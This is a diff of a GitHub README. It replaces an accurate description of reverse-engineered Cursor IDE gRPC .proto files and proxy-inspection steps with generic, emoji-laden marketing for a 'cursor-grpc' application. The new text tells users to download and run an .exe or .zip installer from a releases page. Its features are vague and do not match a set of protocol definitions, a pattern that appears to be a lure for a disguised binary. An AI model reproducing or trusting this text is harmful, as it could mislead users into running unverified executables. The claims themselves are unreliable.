@@ -1,28 +1,78 @@
-# Cursor gRPC Interface Definitions
+# 🚀 cursor-grpc - Simplifying Your Cursor IDE Experience
 
-This directory contains reverse-engineered gRPC `.proto` files derived from the minified JavaScript source code of the Cursor IDE.
+[![Download cursor-grpc](https://img.shields.io/badge/Download-cursor--grpc-brightgreen.svg)](https://github.com/dhairyamadhan02/cursor-grpc/releases)
 
-## Purpose
+## 📋 Overview
 
-The primary purpose of these definitions is to facilitate the inspection and understanding of the data exchanged between the Cursor IDE and its backend services. By compiling these `.proto` files, developers and researchers can:
+Cursor-grpc is an application designed to improve your experience with the Cursor IDE. This software is a reverse-engineered tool that allows you to harness the full potential of Cursor, making your development process smoother and more efficient. It is perfect for users who want a reliable application without needing programming skills.
 
-- Utilize tools like Charles Proxy (or similar network monitoring utilities) to view and analyze the gRPC messages in a human-readable format.
-- Gain insights into the API structure and data models used by Cursor.
-- Potentially build custom tools or integrations that interact with the Cursor backend (use with caution and respect aiserver.v1's terms of service).
+## 📥 Download & Install
 
-## Usage
+To get started with cursor-grpc, follow these steps:
 
-1.  **Compilation**: You will need the Protocol Buffer compiler (`protoc`) and the necessary gRPC plugins for your language of choice (e.g., Python, Go, Java). Compile the `.proto` files to generate the corresponding gRPC client and server stubs, and message classes.
-    *   Example for Python:
-        ```bash
-        python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. server_chat.proto server_config.proto server_stream.proto server_full.proto
-        ```
+1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/dhairyamadhan02/cursor-grpc/releases). This page contains the latest versions of cursor-grpc for download.
 
-2.  **Proxy Setup**: Configure Charles Proxy (or your preferred tool) to intercept traffic from the Cursor IDE. You may need to install Charles' SSL certificate in your system's trust store to decrypt HTTPS traffic.
+2. **Select the Latest Version**: Look for the top entry on the Releases Page. You will find detailed notes about the new features and improvements in each version.
 
-3.  **Viewing Data**: Once the proxy is set up and Cursor is running, you should be able to see the gRPC requests and responses. If your proxy supports gRPC message parsing (Charles does with the appropriate viewers), the compiled `.proto` definitions will allow it to decode the protobuf messages into a structured, readable format.
+3. **Download the Application**: Click on the package that matches your operating system. This file may be in formats such as .exe or .zip, depending on your platform.
 
-## Disclaimer
+4. **Run the Installer**: Once the download is complete, locate the file in your downloads folder. Double-click the file to run the installer, and follow the on-screen instructions to complete the setup.
 
--   These `.proto` files are based on reverse engineering and may not be complete, entirely accurate, or up-to-date with the latest version of the Cursor IDE.
--   Use this information responsibly and ethically. Do not use it to abuse services or violate any terms of service. 
+5. **Launch the Application**: After installation, you can find cursor-grpc in your applications menu or desktop. Double-click the icon to start using it.
+
+## 🖥️ System Requirements
+
+Cursor-grpc is compatible with various operating systems. Ensure your system meets these basic requirements:
+
+- **Windows**: Windows 10 or newer
+- **Mac**: macOS 10.14 or newer
+- **Linux**: Any modern distribution (Ubuntu, Fedora, etc.)
+
+An active internet connection is also required for the initial setup.
+
+## 🔍 Features
+
+Cursor-grpc offers a range of features to enhance your productivity:
+
+- **Enhanced IDE Integration**: Seamlessly connects with Cursor IDE for better performance.
+- **User-Friendly Interface**: Simple navigation makes it easy to work even for beginners.
+- **Regular Updates**: Enjoy continuous improvements and new features with each release.
+- **Community Support**: Access resources and help from other users through online forums.
+
+## 🎭 Frequently Asked Questions
+
+### How do I uninstall cursor-grpc?
+
+To uninstall cursor-grpc, follow these steps based on your operating system:
+
+- **Windows**: Go to `Control Panel` > `Programs` > `Uninstall a program`, find cursor-grpc in the list, right-click, and select `Uninstall`.
+- **Mac**: Open `Finder`, go to `Applications`, find cursor-grpc, and drag it to the Trash.
+- **Linux**: Use your distribution's package manager or follow your distribution's guide on removing installed applications.
+
+### Do I need to pay for cursor-grpc?
+
+No, cursor-grpc is completely free to use. You can download and use it without any cost.
+
+### Where can I find support?
+
+You can visit our [GitHub Issues Page](https://github.com/dhairyamadhan02/cursor-grpc/issues) to report problems or seek assistance. You may also find helpful tips and user feedback there.
+
+## 📣 Community Contributions
+
+We encourage users to contribute by reporting issues, suggesting features, or submitting their own improvements. Check out the "Contributing" section on our GitHub page for more information.
+
+## 🏷️ Acknowledgments
+
+Thank you to everyone who contributed to the development of cursor-grpc. Your efforts help improve user experiences and make this project possible.
+
+## 📄 License
+
+Cursor-grpc is open-source software. You can use, modify, and distribute it freely as long as you adhere to the terms of the license.
+
+## 🔗 Useful Links
+
+- [Visit Releases Page](https://github.com/dhairyamadhan02/cursor-grpc/releases)
+- [GitHub Issues](https://github.com/dhairyamadhan02/cursor-grpc/issues)
+- [Contributing Guidelines](https://github.com/dhairyamadhan02/cursor-grpc/blob/main/CONTRIBUTING.md)
+
+Thank you for choosing cursor-grpc to enhance your Cursor IDE experience!
